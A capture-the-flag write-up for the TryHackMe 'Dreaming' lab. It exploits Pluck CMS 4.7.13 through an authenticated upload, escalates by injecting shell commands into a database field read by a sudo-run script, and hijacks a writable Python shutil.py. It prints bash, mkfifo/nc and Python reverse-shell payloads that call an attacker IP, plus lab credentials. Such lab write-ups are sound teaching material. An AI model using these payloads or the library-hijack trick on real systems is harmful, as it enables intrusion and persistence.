---

Name: Dreaming
Difficulty: Easy
URL: https://tryhackme.com/room/dreaming
Description: Solve the riddle that dreams have woven.

---

## Enumeration

I started with a full TCP port scan:

```bash
$ rustscan -a dreaming.thm -r 1-65535 --ulimit 5000 -- -sC -sV

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

Only SSH and HTTP were exposed.

I then enumerated the web server:

```bash
gobuster dir -url http://dreaming.thm/ \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt \
-t 100 -x txt,php,html,bak,zip,log,old,js -k
```

The interesting result was:

```text
/app                  (Status: 301)
```

Browsing `/app/` revealed a Pluck CMS installation:

```text
http://dreaming.thm/app/pluck-4.7.13/
```

The `file` parameter was also present:

```text
http://dreaming.thm/app/pluck-4.7.13/?file=dreaming
```

This suggested a possible file inclusion vulnerability.

I tried a basic LFI payload:

```text
?file=../../../../../../etc/passwd
```

but the application blocked it:

```text
A hacking attempt has been detected. For security reasons, we're blocking any code execution.
```

At this point I searched for vulnerabilities affecting Pluck 4.7.13.

---

## Initial Access — Pluck CMS

SearchSploit showed an authenticated RCE vulnerability:

```bash
$ searchsploit pluck

Pluck CMS 4.7.13 - File Upload Remote Code Execution (Authenticated) | php/webapps/49909.py
```

The exploit corresponds to **CVE-2020-29607**.

I copied it locally:

```bash
$ searchsploit -m php/webapps/49909.py
```

The exploit required:

```text
target_ip
target_port
password
pluckcmspath
```

I also discovered that the Pluck administration panel was accessible at:

```text
/app/pluck-4.7.13/admin.php
```

It required a password. After a few guesses, I found that the password was:

```text
password
```

I could therefore use the authenticated upload exploit:

```bash
$ python3 49909.py dreaming.thm 80 password /app/pluck-4.7.13/

Authentification was succesfull, uploading webshell

Uploaded Webshell to:
http://dreaming.thm:80/app/pluck-4.7.13//files/shell.phar
```

I started a listener:

```bash
nc -lvnp 4444
```

and triggered the uploaded webshell with a reverse shell payload:

```bash
bash -c 'exec bash -i &>/dev/tcp/192.168.129.192/4444 <&1'
```

This gave me a shell as `www-data`.

---

## www-data → lucien

I checked `/opt`:

```bash
www-data@ip-10-112-180-249:/opt$ ls -l

total 8
-rwxrw-r-- 1 death  death  1574 Aug 15  2023 getDreams.py
-rwxr-xr-x 1 lucien lucien  483 Aug  7  2023 test.py
```

`getDreams.py` was particularly interesting because it connected to a MySQL database using credentials belonging to `death`.

The important part of the script was:

```python
DB_USER = "death"
DB_PASS = "#redacted"
DB_NAME = "library"
```

It queried the `dreams` table and then passed database contents to `subprocess.check_output()` with `shell=True`:

```python
command = f"echo {dreamer} + {dream}"
shell = subprocess.check_output(command, text=True, shell=True)
```

This would become useful later.

I also inspected `test.py`:

```python
url = "http://127.0.0.1/app/pluck-4.7.13/login.php"
password = "HeyLucien#@1999!"

data = {
        "cont1": password,
        "bogus": "",
        "submit": "Log+in"
}
```

This revealed credentials for `lucien`:

```text
HeyLucien#@1999!
```

I switched users:

```bash
$ su lucien
Password:
```

and confirmed the account:

```bash
$ id
uid=1000(lucien) gid=1000(lucien) groups=1000(lucien),4(adm),24(cdrom),30(dip),46(plugdev)
```

---

## lucien → death

I checked `sudo` permissions:

```bash
lucien@ip-10-112-180-249:~$ sudo -l

User lucien may run the following commands:
    (death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py
```

So `lucien` could execute `getDreams.py` as `death`:

```bash
sudo -u death /usr/bin/python3 /home/death/getDreams.py
```

The script initially returned:

```text
Alice + Flying in the sky
Bob + Exploring ancient ruins
Carol + Becoming a successful entrepreneur
Dave + Becoming a professional musician
```

### Command injection

The important vulnerability was in:

```python
command = f"echo {dreamer} + {dream}"
subprocess.check_output(command, text=True, shell=True)
```

Because the values came directly from the database, if I could insert shell metacharacters into a dream, they would eventually be executed by the script.

I found MySQL credentials in `.bash_history`:

```text
mysql -u lucien -plucien42DBPASSWORD
```

I connected to MySQL:

```bash
mysql -u lucien -p
```

and inspected the database:

```sql
SHOW DATABASES;
USE library;
SHOW TABLES;
SELECT * FROM dreams;
```

The table contained:

```text
+---------+------------------------------------+
| dreamer | dream                              |
+---------+------------------------------------+
| Alice   | Flying in the sky                  |
| Bob     | Exploring ancient ruins            |
| Carol   | Becoming a successful entrepreneur |
| Dave    | Becoming a professional musician   |
+---------+------------------------------------+
```

I first tested whether command injection was possible by inserting:

```sql
INSERT INTO dreams (dreamer, dream)
VALUES ('; id #', 'test');
```

Running the script again:

```bash
sudo -u death /usr/bin/python3 /home/death/getDreams.py
```

produced:

```text
uid=1001(death) gid=1001(death) groups=1001(death)
```

This confirmed command execution as `death`.

### Getting a shell as death

Some reverse-shell payloads were too long for the `dreamer` column, so I used the shorter FIFO-based payload in the `dream` field:

```sql
UPDATE dreams
SET dream = '$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.129.192 1234 >/tmp/f)'
WHERE dreamer = 'Bob';
```

I started a listener:

```bash
nc -lvnp 1234
```

Then executed the vulnerable script:

```bash
sudo -u death /usr/bin/python3 /home/death/getDreams.py
```

This gave me a shell as `death`.

---

## death → morpheus

As `death`, I checked `/home/morpheus`:

```bash
death@ip-10-112-180-249:/home/morpheus$ ls -l

total 12
-rw-rw-r-- 1 morpheus morpheus  22 Jul 28  2023 kingdom
-rw-rw---- 1 morpheus morpheus  28 Jul 28  2023 morpheus_flag.txt
-rw-rw-r-- 1 morpheus morpheus 180 Aug  7  2023 restore.py
```

The interesting file was `restore.py`:

```python
from shutil import copy2 as backup

src_file = "/home/morpheus/kingdom"
dst_file = "/kingdom_backup/kingdom"

backup(src_file, dst_file)
print("The kingdom backup has been done!")
```

The script imported `copy2` from Python's `shutil` module.

I checked the permissions on `shutil.py`:

```bash
death@ip-10-112-180-249:/$ ls -la /usr/lib/python3.8/shutil.py

-rw-rw-r-- 1 root death 51474 Mar 18  2025 /usr/lib/python3.8/shutil.py
```

Crucially, `death` had write access to this system Python module.

I also used `pspy` to monitor processes and observed that `restore.py` was periodically executed by `morpheus`.

Therefore, I could modify `shutil.py` and have arbitrary Python code execute when `restore.py` imported it.

I appended a reverse shell to `shutil.py`:

```bash
cat >> /usr/lib/python3.8/shutil.py <<'PY'

import socket, subprocess, os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.129.192", 4321))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

subprocess.call(["/bin/sh", "-i"])
PY
```

I started a listener:

```bash
nc -lvnp 4321
```

When `restore.py` was executed by `morpheus`, Python imported the modified `shutil.py`, causing the reverse shell to execute with `morpheus`'s privileges.

This gave me a shell as `morpheus`.
